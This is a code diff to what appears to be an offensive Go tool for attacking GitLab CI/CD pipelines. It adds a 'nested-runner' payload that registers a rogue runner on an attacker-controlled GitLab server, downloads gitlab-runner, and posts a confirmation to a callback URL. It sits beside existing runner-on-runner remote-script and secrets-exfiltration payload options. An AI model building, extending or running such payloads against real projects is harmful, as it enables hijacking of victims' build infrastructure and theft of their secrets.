@@ -31,6 +31,7 @@ const (
 	payloadRor               = "ror"
 	payloadRunnerOnRunner    = "runner-on-runner"
 	payloadRunnerOnRunnerAlt = "runneronrunner"
+	payloadNestedRunner      = "nested-runner"
 )
 
 // Flags for attack command
@@ -73,6 +74,14 @@ var (
 	atkScriptURL string
 	atkOS        string
 	atkKeepAlive int
+	// nested-runner specific
+	atkNestedGitLabURL string
+	atkNestedRegToken  string
+	atkNestedName      string
+	atkNestedTags      string
+	atkNestedExecutor  string
+	atkNestedCallback  string
+	atkNestedVersion   string
 	// secrets exfil specific
 	atkWebhook     string
 	atkPubkeyFile  string
@@ -2351,6 +2360,14 @@ func init() {
 	attackCmd.Flags().StringVar(&atkScriptURL, "script-url", "", "Remote script URL to execute (runner-on-runner)")
 	attackCmd.Flags().StringVar(&atkOS, "os", "linux", "Target OS for runner-on-runner payload: linux|windows|macos")
 	attackCmd.Flags().IntVar(&atkKeepAlive, "keepalive", 0, "Keep job alive by emitting heartbeat every N seconds (runner-on-runner payload)")
+	// nested-runner specific
+	attackCmd.Flags().StringVar(&atkNestedGitLabURL, "nested-gitlab-url", "", "Attacker-controlled GitLab URL for rogue runner registration (nested-runner)")
+	attackCmd.Flags().StringVar(&atkNestedRegToken, "nested-reg-token", "", "Runner registration token from attacker's GitLab (nested-runner)")
+	attackCmd.Flags().StringVar(&atkNestedName, "nested-name", "", "Name for the rogue runner (default: rogue-runner)")
+	attackCmd.Flags().StringVar(&atkNestedTags, "nested-tags", "", "Comma-separated tags for the rogue runner (default: rogue)")
+	attackCmd.Flags().StringVar(&atkNestedExecutor, "nested-executor", "", "Executor for the rogue runner: shell|docker (default: shell)")
+	attackCmd.Flags().StringVar(&atkNestedCallback, "nested-callback", "", "URL to POST confirmation when rogue runner is registered")
+	attackCmd.Flags().StringVar(&atkNestedVersion, "nested-version", "", "gitlab-runner version to download (default: latest)")
 	// discovery and targeting
 	attackCmd.Flags().BoolVar(&atkDiscoverTags, "discover-tags", false, "Discover runner tags for the target project and exit")
 	attackCmd.Flags().StringVar(&atkExecutor, "executor", "", "Filter discovered tags by executor hint (docker|shell|kubernetes)")
@@ -2591,6 +2608,17 @@ func renderPayload() (string, error) {
 			ScriptURL:        strings.TrimSpace(atkScriptURL),
 			TargetOS:         strings.TrimSpace(atkOS),
 			KeepAliveSeconds: atkKeepAlive,
+		}), nil
+	case payloadNestedRunner:
+		return payloadgen.GenerateNestedRunnerYAML(payloadgen.NestedRunnerOptions{
+			Common:            common,
+			AttackerGitLabURL: strings.TrimSpace(atkNestedGitLabURL),
+			RegistrationToken: strings.TrimSpace(atkNestedRegToken),
+			RunnerName:        strings.TrimSpace(atkNestedName),
+			RunnerTags:        strings.TrimSpace(atkNestedTags),
+			Executor:          strings.TrimSpace(atkNestedExecutor),
+			CallbackURL:       strings.TrimSpace(atkNestedCallback),
+			RunnerVersion:     strings.TrimSpace(atkNestedVersion),
 		}), nil
 	case "secrets", "secrets-exfil", "secrets_exfil":
 		return payloadgen.GenerateSecretsExfilYAML(payloadgen.SecretsExfilOptions{
